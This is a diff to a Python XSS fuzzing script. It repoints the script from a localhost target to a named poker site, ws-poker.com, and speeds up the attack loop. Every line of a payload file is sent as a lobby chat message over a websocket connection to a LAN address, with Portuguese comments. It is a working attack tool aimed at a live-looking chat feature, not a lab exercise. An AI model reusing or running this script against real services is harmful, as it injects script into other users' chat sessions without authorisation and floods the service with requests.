@@ -1,4 +1,4 @@
-
+from websocket import create_connection
 from selenium import webdriver
 from threading import Thread
 from datetime import datetime
@@ -7,9 +7,9 @@ import tornado.ioloop,tornado.web,tornado.options
 
 SERVER_PORT=8787
 #BASE_URL='http://localhost:10080/xss/inline?injected_code='
-BASE_URL='http://localhost:9999/?xss='
+BASE_URL='http://ws-poker.com/index.php'
 PAYLOADS='payload.dat'
-DELAY=3
+DELAY=0.3
 
 
 #Logger
@@ -59,16 +59,23 @@ def Ping(NO,PAYLOAD,BASE_URL):
 #Web Driver
 
 def DriverThread(DRIVER,BASE_URL,PAYLOADS,DELAY):
+#cria conexao
+	ws = create_connection("ws://192.168.25.27:8080")
 	with open(PAYLOADS,'r') as f:
 		payload_collection=f.readlines()
-	print "Started Fuzzing\nPress Ctrl + C to Quit"
+	print "Started Fuzzing\nPress Ctrl + C to Quit\n"+str(len(payload_collection))+" linhas"
 	count=0
 	for payload in payload_collection:
+		payload = payload.replace("\r","")
+		payload = payload.replace("\n","")
 		count+=1
 		DAT="No: "+ str(count) +" Data: " +str(payload)
 		LOG(DAT)
 		try:
-			DRIVER.get(BASE_URL+payload)
+			ws.send('{"event":"lobby_chat", "data": { "from":"breno", "msg":"'+payload+'" }}')
+			print "Tentando: "+'{"event":"lobby_chat", "data": { "from":"breno", "msg":"'+payload+'" }}'
+			#result =  ws.recv()
+			#print "Received '%s'" % result
 	    		Ping(count,payload,BASE_URL)
 	    		time.sleep(DELAY)
 		except Exception as e:
